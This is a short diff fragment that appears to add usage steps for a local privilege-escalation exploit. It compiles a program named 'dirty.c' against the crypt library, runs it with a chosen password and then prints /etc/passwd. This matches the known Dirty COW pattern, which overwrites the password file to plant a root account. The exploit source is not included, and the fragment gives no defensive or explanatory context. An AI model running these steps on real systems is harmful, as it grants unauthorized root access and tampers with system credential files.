@@ -1,0 +1,5 @@
+gcc -pthread dirty.c -o dirty -lcrypt
+
+./dirty password
+
+cat /etc/passwd
